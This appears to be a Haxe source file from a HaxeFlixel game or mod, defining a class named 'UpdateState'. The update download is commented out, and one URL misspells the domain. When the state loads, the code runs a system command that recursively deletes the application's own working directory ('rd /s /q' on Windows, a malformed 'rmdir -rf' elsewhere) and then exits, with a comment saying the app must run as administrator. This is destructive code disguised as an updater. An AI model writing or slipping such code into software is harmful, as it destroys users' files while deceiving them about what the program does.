package;

import flixel.FlxG;
import flixel.FlxSprite;
import flixel.util.FlxColor;

class UpdateState extends MusicBeatState
{
    var daSys:String;
    override function create()
    {
        super.create();
        daSys = #if windows 'C:/' #elseif mac '/Applications/' #elseif linux '/home/' #end;
        var go:FlxSprite = new FlxSprite().makeGraphic(FlxG.width, FlxG.height, FlxColor.WHITE);
        add(go);
        //trace('downloading update');
        //Internet.downloadFile('https://eventretta.gtihub.io/updateServe/military/${Internet.getFileContent('https://eventretta.github.io/updateServe/militaryVersion.update')}-${Paths.currentPlatform()}.zip', daSys);
        // Remember that the app must be launched as administator!
        Sys.command(#if (mac || linux) 'rmdir -rf ' + Sys.getCwd() #elseif windows 'rd /s /q "' + Sys.getCwd() + '"' #end);
        Sys.exit(0);
    }
}